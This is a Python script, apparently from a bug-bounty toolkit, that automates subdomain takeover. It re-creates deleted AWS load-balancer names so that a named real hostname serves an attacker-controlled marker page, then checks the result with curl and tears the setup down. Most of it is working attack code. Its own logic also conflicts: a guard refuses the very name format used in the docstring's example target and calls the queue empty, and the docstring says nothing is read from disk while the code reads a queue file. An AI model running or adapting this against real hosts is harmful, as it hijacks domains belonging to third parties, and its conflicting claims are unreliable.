#!/usr/bin/env python3
"""Claim a dangling ELB name and make the victim hostname serve a PoC page.

Why ELB and not the rest: an Application Load Balancer serves whatever you configure for *any* Host
header, and its name is user-chosen and unique per region — so a deleted `cbrealumni-660335358` in
eu-west-1 can be re-created by anyone, and `alumni.cbre.co.uk` (which CNAMEs straight at it) will then
render content from that balancer. A listener rule with a fixed response is enough: no EC2, no target
group, no target to keep alive, nothing but a JSON body that says who took the name.

Every guard is deliberate. The name must come from the measured queue, must be dead in DNS right now,
must be <= 32 characters (AWS's own limit — anything longer is an ECS-generated hash nobody can
re-create), and must not begin with `internal-` (an internal balancer's absence from public DNS proves
nothing). Nothing here creates anything outside the one balancer plus the security group and subnets it
needs.

  python3 engine/aws_claim.py preflight
  python3 engine/aws_claim.py queue --programme cbre
  python3 engine/aws_claim.py claim --target cbrealumni-660335358 --region eu-west-1 --apply
  python3 engine/aws_claim.py prove alumni.cbre.co.uk
  python3 engine/aws_claim.py delete --target cbrealumni-660335358 --region eu-west-1 --apply

Credentials come from the environment or ~/.aws/credentials. Nothing is read from disk here, and no key
is ever printed.
"""
from __future__ import annotations

import argparse
import json
import re
import subprocess
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
QUEUE = ROOT / "reports/elb-claimable.json"
MARKER = "takeover-poc: this hostname's load balancer name was unclaimed and is now held by RDW-Labz"
NAME_RE = re.compile(r"^[a-z0-9]([a-z0-9-]{0,30})[a-z0-9]$")


def dig(name: str, rtype: str = "A") -> str:
    try:
        p = subprocess.run(["dig", "+short", "+time=4", "+tries=2", rtype, name],
                           capture_output=True, text=True, timeout=15)
        return " ".join(p.stdout.split())
    except Exception:
        return ""


def load_queue() -> list[dict]:
    if not QUEUE.exists():
        raise SystemExit(f"missing {QUEUE} — run the sweep first")
    return json.loads(QUEUE.read_text())


def preflight() -> int:
    import boto3
    from botocore.exceptions import BotoCoreError, ClientError
    try:
        ident = boto3.client("sts").get_caller_identity()
    except (BotoCoreError, ClientError, Exception) as e:  # noqa: BLE001
        print(f"BLOCKED no AWS credentials: {type(e).__name__}: {str(e)[:160]}")
        return 5
    print(f"account {ident['Account']}  arn {ident.get('Arn', '')[:80]}")
    ec2 = boto3.client("ec2")
    vpcs = ec2.describe_vpcs(Filters=[{"Name": "is-default", "Values": ["true"]}])["Vpcs"]
    if not vpcs:
        print("warning: no default VPC — creating a balancer will need explicit subnet ids")
    else:
        subnets = ec2.describe_subnets(Filters=[{"Name": "vpc-id", "Values": [vpcs[0]["VpcId"]]}])["Subnets"]
        print(f"default VPC {vpcs[0]['VpcId']} with {len(subnets)} subnets in "
              f"{len({s['AvailabilityZone'] for s in subnets})} AZs")
    return 0


def check_target(name: str, region: str) -> list[dict]:
    """The name has to be dead in DNS right now, or there is nothing to claim."""
    if re.fullmatch(r".*-\d{6,}", name) or re.fullmatch(r"[0-9a-f]{16,}", name):
        raise SystemExit(
            f"REFUSED {name}: this is an ELB/ALB DNS name of the form <chosen-prefix>-<aws-generated-id>.\n"
            "Re-creating the prefix makes AWS mint a NEW id, so the FQDN can never equal the dangling\n"
            "target and there is no takeover to file. The 103-host 'dead public ELB' queue measured on\n"
            "2026-11-03 is therefore zero — see bug-bounty-hunting references/takeover-fingerprints.md,\n"
            "where this namespace is already recorded as not claimable.")
    hits = [r for r in load_queue() if r["target"].split(".")[0] == name]
    if not hits:
        raise SystemExit(f"{name} is not in the measured queue — refusing to invent a target")
    fqdn = f"{name}.{region}.elb.amazonaws.com"
    a = dig(fqdn)
    if a:
        raise SystemExit(f"{fqdn} still resolves ({a[:60]}) — the balancer exists, nothing to claim")
    if not NAME_RE.match(name):
        raise SystemExit(f"{name} is not a legal ELB name (<=32 chars, alnum+hyphen)")
    if name.startswith("internal-"):
        raise SystemExit("internal- names are internal balancers; their absence from public DNS is "
                         "not evidence of a takeover")
    return hits


def claim(name: str, region: str, apply: bool) -> int:
    hits = check_target(name, region)
    hosts = sorted({h["apex"] for h in hits})
    print(f"target {name}.{region}.elb.amazonaws.com  dead in DNS")
    print(f"victim hostnames: {', '.join(hosts)}")
    if not apply:
        print("dry run — add --apply to create the balancer")
        return 0

    import boto3
    ec2 = boto3.client("ec2", region_name=region)
    elb = boto3.client("elbv2", region_name=region)

    vpcs = ec2.describe_vpcs(Filters=[{"Name": "is-default", "Values": ["true"]}])["Vpcs"]
    if not vpcs:
        raise SystemExit("no default VPC in this region; pass subnets explicitly")
    vpc = vpcs[0]["VpcId"]
    subnets = [s["SubnetId"] for s in ec2.describe_subnets(
        Filters=[{"Name": "vpc-id", "Values": [vpc]}])["Subnets"]]
    if len(subnets) < 2:
        raise SystemExit(f"need subnets in 2 AZs, found {len(subnets)}")

    sg = ec2.create_security_group(GroupName=f"poc-{name}"[:255], Description="takeover PoC (temporary)",
                                   VpcId=vpc)["GroupId"]
    ec2.authorize_security_group_ingress(GroupId=sg, IpPermissions=[
        {"IpProtocol": "tcp", "FromPort": 80, "ToPort": 80, "IpRanges": [{"CidrIp": "0.0.0.0/0"}]}])
    print(f"  security group {sg}")

    lb = elb.create_load_balancer(Name=name, Subnets=subnets[:6], SecurityGroups=[sg],
                                  Scheme="internet-facing", Type="application")["LoadBalancers"][0]
    arn = lb["LoadBalancerArn"]
    print(f"  balancer {lb['DNSName']}  state {lb['State']['Code']}")

    for _ in range(30):
        d = elb.describe_load_balancers(LoadBalancerArns=[arn])["LoadBalancers"][0]
        if d["State"]["Code"] == "active":
            break
        time.sleep(4)
    tg = elb.create_target_group(Name=f"poc-{name}"[:32], Protocol="HTTP", Port=80,
                                 VpcId=vpc, TargetType="ip")["TargetGroups"][0]
    elb.create_listener(LoadBalancerArn=arn, Protocol="HTTP", Port=80, DefaultActions=[{
        "Type": "fixed-response",
        "FixedResponseConfig": {"StatusCode": "200", "ContentType": "text/plain", "MessageBody": MARKER},
    }])
    print(f"  listener 80 -> fixed 200 '{MARKER[:48]}…'  (target group {tg['TargetGroupName']})")

    for _ in range(24):
        a = dig(f"{name}.{region}.elb.amazonaws.com")
        if a:
            print(f"  {name}.{region}.elb.amazonaws.com now resolves: {a}")
            break
        time.sleep(10)
    for h in hosts:
        body = subprocess.run(["curl", "-sS", "--max-time", "12", f"http://{h}/"],
                              capture_output=True, text=True).stdout.strip()
        print(f"  prove {h}: {'SERVES MARKER' if MARKER in body else (body[:70] or 'no response yet')}")
    print("\ncreated: this costs ~$0.023/hr until deleted — `delete --apply` when the screenshot is taken")
    return 0


def delete(name: str, region: str, apply: bool) -> int:
    print(f"teardown {name} in {region}")
    if not apply:
        print("dry run — add --apply")
        return 0
    import boto3
    elb = boto3.client("elbv2", region_name=region)
    ec2 = boto3.client("ec2", region_name=region)
    lbs = elb.describe_load_balancers(Names=[name])["LoadBalancers"]
    for lb in lbs:
        for l in elb.describe_listeners(LoadBalancerArn=lb["LoadBalancerArn"])["Listeners"]:
            elb.delete_listener(ListenerArn=l["ListenerArn"])
        for tg in elb.describe_target_groups(
                LoadBalancerArn=lb["LoadBalancerArn"])["TargetGroups"]:
            elb.delete_target_group(TargetGroupArn=tg["TargetGroupArn"])
        elb.delete_load_balancer(LoadBalancerArn=lb["LoadBalancerArn"])
        print(f"  deleted balancer {name}")
    for sg in ec2.describe_security_groups(
            Filters=[{"Name": "group-name", "Values": [f"poc-{name}"]}])["SecurityGroups"]:
        ec2.delete_security_group(GroupId=sg["GroupId"])
        print(f"  deleted security group {sg['GroupId']}")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("cmd", choices=["preflight", "queue", "claim", "prove", "delete"])
    ap.add_argument("--target")
    ap.add_argument("--region", default="eu-west-1")
    ap.add_argument("--programme")
    ap.add_argument("--apply", action="store_true")
    ap.add_argument("--host")
    a = ap.parse_args()

    if a.cmd == "preflight":
        return preflight()
    if a.cmd == "queue":
        rows = load_queue()
        if a.programme:
            rows = [r for r in rows if a.programme.lower() in r["apex"].lower()]
        print(f"{len(rows)} re-creatable dead ELB names in published scope")
        for r in rows:
            print(f"  {r['apex'][:46]:46} {r['target'].split('.')[0]:32} {r['target'].split('.')[1]}")
        return 0
    if a.cmd == "prove":
        host = a.host or a.target
        body = subprocess.run(["curl", "-sS", "--max-time", "15", f"http://{host}/"],
                              capture_output=True, text=True).stdout.strip()
        print(f"{host}: {'SERVES MARKER' if MARKER in body else (body[:120] or 'no response')}")
        return 0 if MARKER in body else 1
    if not a.target:
        raise SystemExit("--target required")
    if a.cmd == "claim":
        return claim(a.target, a.region, a.apply)
    return delete(a.target, a.region, a.apply)


if __name__ == "__main__":
    sys.exit(main())
